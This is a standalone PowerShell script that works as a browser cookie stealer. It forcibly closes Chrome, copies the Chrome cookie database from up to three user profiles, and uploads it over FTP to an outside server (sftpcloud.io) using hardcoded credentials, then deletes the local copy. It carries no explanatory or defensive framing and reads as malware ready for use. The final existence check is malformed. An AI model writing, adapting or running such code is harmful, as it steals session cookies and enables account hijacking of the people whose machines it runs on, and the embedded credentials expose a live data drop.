# Close Chrome before running the script
try {
    Stop-Process -Name "chrome" -Force -ErrorAction Stop
    Write-Host "Chrome has been closed."
} catch {
    Write-Host "Chrome was not running."
}

# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# Resolve the %USERNAME% environment variable correctly in PowerShell
$userName = $env:USERNAME

# Directories to work with, correctly replacing %USERNAME% with actual username
$source_directory_1 = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
$source_directory_2 = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
$source_directory_3 = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies"

# FTP function to upload files, now directing files to /Cookies directory
function Upload-ToFtp {
    param (
        [String]$file_path,
        [String]$file_name
    )
    # Load Assembly and create FTPWebRequest to /Cookies directory
    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
    Add-Type -AssemblyName System.Net
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    $ftpRequest.KeepAlive = $false

    # Read file content
    $content = Get-Content -Path $file_path -Encoding Byte -ReadCount 0
    $ftpRequest.ContentLength = $content.Length

    # Get request stream and upload the file
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($content, 0, $content.Length)
    $requestStream.Close()

    Write-Host "Uploaded $file_name to FTP in /Cookies."
}

# Sequentially check each directory and upload if the Cookies file is found
$source_directories = @($source_directory_1, $source_directory_2, $source_directory_3)
foreach ($source_directory in $source_directories) {
    if (Test-Path $source_directory) {
        $file_name = [System.IO.Path]::GetFileName($source_directory)
        $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name # Use a common temp directory for consistency
        Copy-Item -Path $source_directory -Destination $temp_path # Copy the file to a temporary location
        Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
        Remove-Item -Path $temp_path # Clean up the temporary file
        break # Stop checking once the first file is found and uploaded
    }
}

# If none of the files were found and uploaded
if (-not (Test-Path $source_directory_1 -Or Test-Path $source_directory_2 -Or Test-Path $source_directory_3)) {
    Write-Host "None of the directories or files exist."
}
